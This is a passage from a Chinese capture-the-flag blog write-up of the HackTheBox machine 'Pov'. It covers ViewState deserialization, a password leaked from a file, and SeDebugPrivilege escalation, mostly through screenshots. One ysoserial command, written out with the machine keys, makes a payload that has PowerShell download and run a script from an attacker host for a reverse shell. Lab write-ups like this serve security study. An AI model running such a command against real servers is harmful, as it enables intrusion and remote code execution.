+<h4 id="初次尝试"><a href="#初次尝试" class="headerlink" title="初次尝试"></a>初次尝试</h4><p>尝试访问自己的服务器<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706509480796-460817cb-1c43-4def-8932-42033c303bea.png#averageHue=%2315182a&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=450&amp;id=u1a322b09&amp;originHeight=788&amp;originWidth=2336&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=268800&amp;status=done&amp;style=none&amp;taskId=ua87dd13e-d400-4c66-aae9-9ae68b25413&amp;title=&amp;width=1334.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./ysoserial.exe <span class="hljs-literal">-p</span> ViewState <span class="hljs-literal">-g</span> TypeConfuseDelegate <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;powershell.exe IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.46/ps/run64htb.txt&#x27;)&quot;</span> <span class="hljs-literal">--path</span>=<span class="hljs-string">&quot;/portfolio/default.aspx&quot;</span> <span class="hljs-literal">--apppath</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-literal">--decryptionalg</span>=<span class="hljs-string">&quot;AES&quot;</span> <span class="hljs-literal">--decryptionkey</span>=<span class="hljs-string">&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot;</span> <span class="hljs-literal">--validationalg</span>=<span class="hljs-string">&quot;SHA1&quot;</span> <span class="hljs-literal">--validationkey</span>=<span class="hljs-string">&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></code></pre></td></tr></table></figure>
+<p>执行<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706514747171-c3cdc331-e960-4f9e-baa0-7d6909a07511.png#averageHue=%23f3ecec&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=866&amp;id=uf2de4f46&amp;originHeight=1516&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=797774&amp;status=done&amp;style=none&amp;taskId=u2838d9bf-81bd-4acf-80c2-3f7faffc96d&amp;title=&amp;width=1462.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"><br>上线<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706581792592-43055079-b16a-4250-80a5-7ddc2a3f525d.png#averageHue=%2316192b&amp;clientId=ud4e41c2f-4b01-4&amp;from=paste&amp;height=667&amp;id=ua4d37480&amp;originHeight=1168&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=154071&amp;status=done&amp;style=none&amp;taskId=u2b6b4a60-b24d-4a1f-8f7f-e944090cbaa&amp;title=&amp;width=1255.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706583939883-1019a7c9-178a-430e-aedb-1ea7ed79e604.png#averageHue=%23191c2d&amp;clientId=u31caec9a-5529-4&amp;from=paste&amp;height=591&amp;id=u54d10c80&amp;originHeight=1034&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=301109&amp;status=done&amp;style=none&amp;taskId=uc133facc-4e63-4be9-9dcb-c1e3a294337&amp;title=&amp;width=1255.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="文件泄露密码"><a href="#文件泄露密码" class="headerlink" title="文件泄露密码"></a>文件泄露密码</h4><p>Documents 下找到 connection.xml 文件<br>获得 alaading 用户密码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706584883330-e88e0b6d-dbf2-46e8-b829-59ae8ab9ae0b.png#averageHue=%2315182a&amp;clientId=u31caec9a-5529-4&amp;from=paste&amp;height=591&amp;id=u3cc62c33&amp;originHeight=1034&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=188019&amp;status=done&amp;style=none&amp;taskId=u3073aadb-a1c5-49c5-909a-3d5298a95d8&amp;title=&amp;width=1255.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"><br>但这个文件没有被 winPEAS 发现吗？于是我又跑了一遍<br>在 winPEAS 中被拆分识别成了 Token，以后要多看一眼文件名了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706585181135-907dc03f-2dde-4912-beee-a0512c652da4.png#averageHue=%2315182a&amp;clientId=u31caec9a-5529-4&amp;from=paste&amp;height=591&amp;id=ud17e7a0f&amp;originHeight=1034&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=395585&amp;status=done&amp;style=none&amp;taskId=u2830f64a-92a0-40b9-aeed-57cc15e9148&amp;title=&amp;width=1255.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="powershell-获取密码"><a href="#powershell-获取密码" class="headerlink" title="powershell 获取密码"></a>powershell 获取密码</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706586083365-3541ce4d-1204-4128-a225-0da12da7cded.png#averageHue=%2315182a&amp;clientId=u31caec9a-5529-4&amp;from=paste&amp;height=363&amp;id=uaa88dd2a&amp;originHeight=636&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=119116&amp;status=done&amp;style=none&amp;taskId=u666a9621-39bb-4b27-8e4c-517053519f5&amp;title=&amp;width=1255.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="sliver-runas-上线-alaading"><a href="#sliver-runas-上线-alaading" class="headerlink" title="sliver runas 上线 alaading"></a>sliver runas 上线 alaading</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706757692165-5a030438-9111-413d-bb13-8d9c532ed99c.png#averageHue=%2315182a&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=178&amp;id=u566ec731&amp;originHeight=312&amp;originWidth=2211&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=73678&amp;status=done&amp;style=none&amp;taskId=ud5f12c55-7f2e-46ff-acd3-b49078099e9&amp;title=&amp;width=1263.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="SeDebugPrivilege-提权"><a href="#SeDebugPrivilege-提权" class="headerlink" title="SeDebugPrivilege 提权"></a>SeDebugPrivilege 提权</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706757731861-61dd45b4-90bc-4f6f-af59-02a256172213.png#averageHue=%2315182a&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=476&amp;id=u49bcd746&amp;originHeight=833&amp;originWidth=2211&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=129718&amp;status=done&amp;style=none&amp;taskId=ubc47281b-70af-41dd-b1f0-5e9eec733fc&amp;title=&amp;width=1263.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"><br>存在 SeDebugPrivilege 权限，我们直接迁移到 winlogin 进程就能提权到 SYSTEM<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706757895718-c74cf479-db4a-49eb-b58d-6192241e4eb6.png#averageHue=%2315182a&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=630&amp;id=u9ac2bef9&amp;originHeight=1103&amp;originWidth=2211&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=196486&amp;status=done&amp;style=none&amp;taskId=u785191de-ae3b-495f-a165-9ef1816bce7&amp;title=&amp;width=1263.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="flag-提交失败"><a href="#flag-提交失败" class="headerlink" title="flag 提交失败"></a>flag 提交失败</h4><p>1月31号的时候就打完了，但是 flag 一直提交失败。<br>这个老哥也遇到了同样的问题<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706758769120-d631176c-894f-43f0-9ff0-7558550671ad.png#averageHue=%23151c2b&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=312&amp;id=ue4039664&amp;originHeight=546&amp;originWidth=2526&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=103072&amp;status=done&amp;style=none&amp;taskId=u9ec9ef60-19b3-4f43-9dda-82cbdee8099&amp;title=&amp;width=1443.4285714285713" srcset="/img/loading.gif" lazyload alt="image.png"><br>2月1号又试了一下，这次问题就解决了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706757991527-52a47a21-13b1-42eb-bc8f-55ed1293f913.png#averageHue=%23192231&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=779&amp;id=ub5ab4ccb&amp;originHeight=1364&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=732462&amp;status=done&amp;style=none&amp;taskId=ub2a1dff6-089d-4025-8567-de2bd533307&amp;title=&amp;width=1462.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pentest/" class="category-chain-item">Pentest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Pov</div>
+      <div>http://aurey7.github.io.git/2024/02/04/Pov/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Aurey7</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/22/Drive-HackTheBox/" title="Drive HackTheBox">
+                        <span class="hidden-mobile">Drive HackTheBox</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"p05Dpl9y8j46kYbkrPmdQHe5-gzGzoHsz","appKey":"AG8e6lFbZr5DSdTu49Bs70X0","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
